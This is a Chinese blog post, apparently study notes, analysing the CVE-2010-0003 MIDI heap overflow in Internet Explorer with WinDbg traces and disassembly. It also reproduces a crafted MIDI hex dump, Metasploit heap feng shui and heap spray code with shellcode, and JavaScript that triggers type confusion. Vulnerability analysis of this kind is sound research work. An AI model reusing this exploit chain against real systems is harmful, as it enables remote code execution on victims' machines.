	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16843019=??
	这里可以看到的确是会触发异常的,也即+hpa时是第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处会
	访问异常,-hpa情况会怎样呢?进行如下操作验证:

关闭windbg,重新打开ie
gflags -i iexplore.exe -hpa
打开windbg,f6加载iexplore.exe
bu WINMM!midiOutPlayNextPolyEvent+0x1ec
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=0256aa28 esi=0256aa18 edi=0256aa70
	eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff98000 edx=0256aa28 esi=0256aa18 edi=0256aa70
	eip=76b2d038 esp=0392fea4 ebp=0392fedc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=025cae59 edi=0256aa18
	eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cae59=00
g
	Breakpoint 0 hit
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=025cb021 edi=0256aa18
	eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cb021=00
	可以看到-hpa情况下在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处是不会产生访问异常的,结合
	+hpa的功能(定位导致漏洞的代码或函数)可知在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处的
	这句指令将导致产生&quot;堆溢出&quot;

u .
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]
	76b2d226 8ad0            mov     dl,al
	76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
	76b2d22a 80e2f0          and     dl,0F0h
	76b2d22d 80faf0          cmp     dl,0F0h
	76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d232 0410            add     al,10h
	76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
	看到的不多,扩大汇编指令范围

u eip-30 eip+30
	WINMM!midiOutPlayNextPolyEvent+0x1bc:
	76b2d1f4 e2f0            loop    WINMM!midiOutPlayNextPolyEvent+0x1ae (76b2d1e6)
	76b2d1f6 80fa90          cmp     dl,90h
	76b2d1f9 8855ff          mov     byte ptr [ebp-1],dl
	76b2d1fc 7405            je      WINMM!midiOutPlayNextPolyEvent+0x1cb (76b2d203)
	76b2d1fe 80fa80          cmp     dl,80h
	76b2d201 755c            jne     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d203 0fb6550b        movzx   edx,byte ptr [ebp+0Bh]
	76b2d207 83e00f          and     eax,0Fh
	76b2d20a c1e007          shl     eax,7
	76b2d20d 03c2            add     eax,edx
	76b2d20f 99              cdq
	76b2d210 2bc2            sub     eax,edx
	76b2d212 d1f8            sar     eax,1
	76b2d214 807dff80        cmp     byte ptr [ebp-1],80h
	76b2d218 742a            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
	76b2d21a 84db            test    bl,bl
	76b2d21c 7426            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
	[***]76b2d21e 03f0            add     esi,eax
	76b2d220 f6450b01        test    byte ptr [ebp+0Bh],1
	[==============&amp;gt;eip]76b2d224 8a06            mov     al,byte ptr [esi]
	76b2d226 8ad0            mov     dl,al
	76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
	76b2d22a 80e2f0          and     dl,0F0h
	76b2d22d 80faf0          cmp     dl,0F0h
	76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d232 0410            add     al,10h
	76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
	76b2d236 80e20f          and     dl,0Fh
	76b2d239 80fa0f          cmp     dl,0Fh
	76b2d23c 7421            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	[***]76b2d23e fec0            inc     al
	[***]76b2d240 8806            mov     byte ptr [esi],al
	76b2d242 eb1b            jmp     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d244 f6450b01        test    byte ptr [ebp+0Bh],1
	76b2d248 8d1430          lea     edx,[eax+esi]
	76b2d24b 8a02            mov     al,byte ptr [edx]
	76b2d24d 7408            je      WINMM!midiOutPlayNextPolyEvent+0x21f (76b2d257)
	76b2d24f a8f0            test    al,0F0h
	76b2d251 740c            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d253 2c10            sub     al,10h
	在当前eip处eax=0x419,而eip最近执行过的与eax相关的指令为76b2d21e处的add esi,eax,书中分析的是此处的esi来源于
	winmmAlloc(0x400)分配到的内存地址,而add esi,eax中的eax=0x419超过了分配的0x400导致访问到超出0x19大小处的内容
	,在eip下面的76b2d23e和76b2d240处可以看到,[esi]的值会加1,也即在超出0x19大小处的内存中的内容会加1,这就是这个
	漏洞的危害:导致内存某处的值+1,只要能够控制这个0x19处的内存的内容,就有机会利用这个漏洞.

	上面之所以会有76b2d240处的导致[esi]加1的出现,是要在mid文件中的某个音轨事件处写上&quot;打开音符&quot;对应的值
	(书中是0x0073b29f),如下||之间的内容

	00000000: 4d54 6864 0000 0006 0000 0001 0060 4d54  MThd.........`MT
	00000010: 726b 0000 0035 00ff 030d 4472 756d 7320  rk...5....Drums 
	00000020: 2020 2842 4229 0000 c928 00b9 0764 00b9    (BB)...(...d..
	00000030: 0a40 00b9 7b00 00b9 5b28 00b9 5d00 8550  .@..{...[(..]..P
	00000040: 9923 7f00|9fb2 7300|ff2f 000a            .#....s../..

	满足mid文件中对应位置处的值为&quot;打开音符&quot;后,会导致在当前eip环境下的[esi]加1,也即76b2d21e执行后的[esi]加1,也即
	winAlloc(0x400)分配到的内存地址+0x19处的内容加1,而利用方式中正好是利用相应内存中的值加1导致任意代码执行.书
	中通过ida的f5分析函数调用与参数传递分析得到上面的esi的源是winmmAlloc(0x400),也即在打开mid文件后会有一个这样
	的内存分配动作,于是构造出如下结构的内存空间使得winmmAlloc(0x400)分到的内存地址相对可控:
	|xxxxxxxx|oooooooo|xxxxxxxxx|ooooooooo|xxxxxxxxx|ooooooooo|...
	也即在mid文件被ie解析之前,先用js构造上面这样的内存格式,其中xxx表示有数据,ooo表示空闲内存,每个||之间的内存大
	小正好为0x400,这样在上面内存结构的基础上再由ie解析mid文件而产生winmmAlloc(0x400)的动作就会分配到上面的ooo的
	某个位置上,然后由于mid文件是特殊的构造好的会使winmmAlloc(0x400)分到的内存地址+0x19处的内存的内容加1的文件,
	于是ie解析mid文件后,将导致winmmAlloc(0x400)分到的某个ooo位置的右边一个xxx的位置上的偏移0x19中的值加1,当上面
	构造的特殊内存格式时构造好该位置内容的值+1会使得代码执行时,就可以利用这个漏洞了,而书中(msf)的利用方式是用下
	面的js来达到目的的:

	[msf中的构造特殊内存结构的由ruby写的js]
    def build_element(element_name, my_target, type=&quot;corruption&quot;)
      dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack(&quot;V&quot;))
      element = ''
  
      if my_target.name =~ /IE 8/
        max   = 63   # Number of attributes for IE 8
        index = 1    # Where we want to confuse the type
      else
        max   = 55   # Number of attributes for before IE 8
        index = 0    # Where we want to confuse the type
      end
  
      element &amp;lt;&amp;lt; &quot;var #{element_name} = document.createElement(\&quot;select\&quot;)&quot; + &quot;\n&quot;
  
      # Build attributes
      0.upto(max) do |i|
        case type
          when &quot;corruption&quot;
            obj = (i==index) ? &quot;unescape(\&quot;#{dst}\&quot;)&quot; : &quot;alert&quot;
          else #leak
            obj = &quot;alert&quot;
        end
        element &amp;lt;&amp;lt; &quot;#{element_name}.w#{i.to_s} = #{obj}&quot; + &quot;\n&quot;
      end
  
      return element
    end

    # Feng Shui and triggering Steps:
    # 1. Run the garbage collector before allocations
    # 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)
    # 3. Make holes
    # 4. Let windows media play the crafted midi file and corrupt the heap
    # 5. Force the using of the confused tagVARIANT.
    def build_trigger(my_target, type=&quot;corruption&quot;)
      js_trigger = build_trigger_fn(my_target, type)
      select_element = build_element('selob', my_target, type)
  
      trigger = &amp;lt;&amp;lt;-JS
        var heap = new heapLib.ie();
        #{select_element}
        var clones = new Array(1000);
  
        function feng_shui() {
          heap.gc();
  
          var i = 0;
          while (i &amp;lt; 1000) {
            clones[i] = selob.cloneNode(true)
            i = i + 1;
          }
  
          var j = 0;
          while (j &amp;lt; 1000) {
            delete clones[j];
            CollectGarbage();
            j  = j + 2;
          }
        }
  
        feng_shui();
  
        #{js_trigger}
      JS
  
      trigger = heaplib(trigger, {:noobfu =&amp;gt; true})
      return trigger
    end

	上面msf中的代码对应书中的如下代码:
	var selob=document.createElement(&quot;select&quot;)
	selob.w0=alert
	selob.w1=unescape(&quot;%u0c0c %u0c0c&quot;)
	selob.w2=alert
	selob.w3=alert
	selob.w4=alert
	selob.w5=alert
	...
	...
	selob.w63=alert

	var clones=new Array(1000)
	
	function feng_shui(){

	var i=0
	while (i&amp;lt;1000){
	clones[i]=selob.cloneNode(true)
	i=i+1
	}

	var j=0
	while(j&amp;lt;1000){
	delete clones[j]
	CollectGarbage()
	j=j+2
	}
	}

	上面为了达到某处内容值+1得到控制代码执行的目的使用的是:
	创建select元素selob,设置64个属性,其中w1为string类型,其余为object类型,然后创建一个数组用来存放1000个selob元
	素,然后间隔释放1000个selob元素中的500个元素,然后由于ie解析mid文件,运行了winmmAlloc(0x400),得到的分配地址位
	于某个释放的selob元素的位置,由于mid文件中某处已经构造好了音轨事件是&quot;打开音符&quot;,于是会使得某个selob元素的+19
	位置的值+1,于是该selob元素的第二个属性w1由string变成object,然后由下面的js来触发这个变成object的属性相应函数
	的执行,触发js如下:

	function trigger(){
	var k=999
	while (k&amp;gt;0){
	if (typeof(clones[k].w1)==&quot;string&quot;){
	}else{
	clone[k].w1('come on!')
	}
	
	k=k-2
	}
	feng_shui()
	document.audio.Play()
	}

	上面的js中的函数trigger由下面的js调用执行(执行trigger函数在ie解析mid文件之后[也即在上面的
	document.audio.Play执行之后]):

	&amp;lt;/script&amp;gt;
	&amp;lt;script for=audio event=PlayStateChange(oldState,newState)&amp;gt;
		if (oldState == 3 &amp;amp;&amp;amp; newState == 0) {
			trigger();
		}
	&amp;lt;/script&amp;gt;

	在js构造的string变成object的属性时执行的函数的地址为0x0c0c0c0c是堆喷射的利用地址,对应msf中的构造堆喷射内存
	布局的代码如下:

    def build_spray(my_target, leak=0)
  
      # Extract string based on target
      if my_target.name == 'IE 8 on Windows XP SP3'
        js_extract_str = &quot;var block = shellcode.substring(2, (0x40000-0x21)/2);&quot;
      else
        js_extract_str = &quot;var block = shellcode.substring(0, (0x80000-6)/2);&quot;
      end
  
      # Build shellcode based on Rop requirement
      code = ''
      if my_target['Rop'] and datastore['MSHTML'].to_s != ''
        print_status(&quot;Generating ROP using info-leak: 0x#{leak.to_s(16)}&quot;)
        code &amp;lt;&amp;lt; create_info_leak_rop(my_target, leak)
        code &amp;lt;&amp;lt; payload.encoded
      elsif my_target['Rop'] and datastore['MSHTML'].to_s == ''
        print_status(&quot;Generating ROP using msvcrt&quot;)
        code &amp;lt;&amp;lt; create_rop(my_target, payload.encoded)
      else
        code &amp;lt;&amp;lt; payload.encoded
      end
  
      shellcode = Rex::Text.to_unescape(code)
  
      # 1. Create  big block of nops
      # 2. Compose one block which is nops + shellcode
      # 3. Repeat the block
      # 4. Extract string from the big block
      # 5. Spray
      spray = &amp;lt;&amp;lt;-JS
      var heap_obj = new heapLib.ie(0x10000);
  
      var code = unescape(&quot;#{shellcode}&quot;);
      var nops = unescape(&quot;%u0c0c%u0c0c&quot;);
  
      while (nops.length &amp;lt; 0x1000) nops+= nops;
      var shellcode =  nops.substring(0,0x800 - code.length) + code;
      while (shellcode.length &amp;lt; 0x40000) shellcode += shellcode;
  
      #{js_extract_str}
  
      heap_obj.gc();
      for (var i=0; i &amp;lt; 600; i++) {
        heap_obj.alloc(block);
      }
  
      JS
  
      spray = heaplib(spray, {:noobfu =&amp;gt; true})
      return spray
    end
  	  		
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-小结&quot;&gt;0x03 小结&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞场景:
程序(iexplore.exe)解析特殊构造的文件(mid)时,在内存中可找到有内存分配动作(winmmAlloc),分配的内存大小一定
(0x400),如果解析特殊文件(mid中音轨事件为打开音符)会使程序在分配到的内存地址范围之外(0x419&amp;gt;0x400)有改变
大小动作(使0x419偏移处的值+1)

利用方法:
可以通过与这里相同的js的构造特殊内存结构的方法来利用这个改变动作来控制eip.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;首发于安全客,版权归安全客所有,http://bobao.360.cn/learning/detail/3278.html&lt;/p&gt;
</description>
        <pubDate>Fri, 09 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-0003/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-0003/</guid>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        <category>堆溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
  </channel>
</rss>
